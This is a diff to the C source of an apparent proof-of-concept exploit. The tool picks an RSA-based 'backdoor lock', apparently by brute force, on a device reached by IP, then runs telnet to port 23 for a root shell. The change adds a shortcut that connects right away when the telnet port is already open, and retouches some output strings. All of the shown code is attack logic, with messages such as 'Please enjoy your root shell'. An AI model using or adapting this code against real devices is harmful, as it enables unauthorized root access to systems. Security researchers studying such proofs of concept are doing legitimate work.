@@ -366,12 +366,19 @@ int main(int argc, char **argv) {
   long int start;
   long int elapsed;
 
-  printf("[+] Initializing RSA Cipher with:\n- hardcoded e: 0x%X\n- hardcoded n: 0x%s\n- no padding\n", HARDCODED_e, HARDCODED_n);
+  printf("[+] Initializing RSA Cipher with:\n    - hardcoded e: 0x%X\n    - hardcoded n: 0x%s\n    - no padding\n", HARDCODED_e, HARDCODED_n);
 
   rsa = init_rsa();
   telnet_command = malloc(0x80 * sizeof(char));
   sprintf(telnet_command, "telnet %s 23", ip_addr);
   
+  if (check_tcp_port(ip_addr, TELNET_PORT)) {
+    printf("[!] The back door is already open! Why not killall telnetd and try again?\n");
+    system(telnet_command);
+    printf("[*] Have a nice day.\n");
+    exit(0);
+  }
+
   gettimeofday(&timecheck, NULL);
   start = (long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000;
 
@@ -434,7 +441,7 @@ int main(int argc, char **argv) {
       gettimeofday(&timecheck, NULL);
       elapsed = ((long)timecheck.tv_sec * 1000 + (long)timecheck.tv_usec / 1000) - start;
 
-      printf("[*] The backdoor lock has been picked in %ld msec with %d attempts.\n", elapsed, tries - tries_left);
+      printf("[*] Backdoor lock picked in %ld msec with %d attempts.\n", elapsed, tries - tries_left);
       printf("[*] Please enjoy your root shell.\n");
       system(telnet_command);
       printf("[*] PoC complete. Have a nice day.\n");
